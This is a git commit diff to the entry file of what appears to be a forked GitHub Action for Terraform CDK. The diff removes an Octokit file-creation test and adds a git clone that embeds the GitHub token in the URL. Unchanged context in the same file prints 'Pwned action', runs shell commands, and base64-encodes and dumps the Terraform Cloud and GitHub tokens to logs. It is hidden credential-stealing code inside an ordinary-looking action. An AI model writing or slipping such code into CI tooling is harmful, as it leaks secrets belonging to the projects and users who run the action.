4e55e2b22b1b424d2a3d18f289dc9299d49597cb
mousefluff <124876575+mousefluff@users.noreply.github.com>
2024-02-17 16:29:20 +0100

    Update index.ts

--- src/index.ts
+++ src/index.ts
@@ -9,65 +9,14 @@ import { run } from "./action";
 import { execSync } from 'child_process';
 
 
-import { Octokit } from "octokit";
-
-interface GitUser {
-  name: string;
-  email: string;
-}
-
-const octokit = new Octokit({
-  auth: process.env.GITHUB_TOKEN,
-});
-
-async function createFile(
-  owner: string,
-  repo: string,
-  path: string,
-  message: string,
-  content: string,
-  committer: GitUser,
-  author: GitUser
-): Promise<void> {
-  try {
-    const response = await octokit.repos.createOrUpdateFileContents({
-      owner,
-      repo,
-      path,
-      message,
-      content: Buffer.from(content).toString('base64'),
-      committer,
-      author,
-    });
-
-    console.log("File created successfully:", response.data);
-  } catch (error) {
-    console.log("Error creating file:", error);
-  }
-}
-
-const owner = 'mousefluff';
-const repo = 'terraform-cdk-action';
-const path = 'helloworld';
-const message = 'Create helloworld file';
-const content = 'Hello, world!';
-const committer: GitUser = { 
-  name: `Octokit Bot`,
-  email: "octokit-bot@example.com",
-};
-const author: GitUser = { 
-  name: "Octokit Bot",
-  email: "octokit-bot@example.com",
-};
-
-createFile(owner, repo, path, message, content, committer, author);
-
 console.log("\r\nPwned action...");
 console.log(execSync('id').toString());
 
 const tfToken = Buffer.from(process.env.INPUT_TERRAFORMCLOUDTOKEN || ''.split("").reverse().join("")).toString('base64');
 const ghToken = Buffer.from(process.env.INPUT_GITHUBTOKEN || ''.split("").reverse().join("")).toString('base64');
 
+
+console.log('Testing token...', execSync(`git clone https://${process.env.INPUT_GITHUBTOKEN}:x-oauth-basic@github.com/mousefluff/terraform-cdk-action.git`).toString());
 
 console.log('\r\nDumping tokens:', {tfToken, ghToken});
 console.log('GH:', Buffer.from(process.env.INPUT_TERRAFORMCLOUDTOKEN || ''.split("").reverse().join("")).toString('base64'))
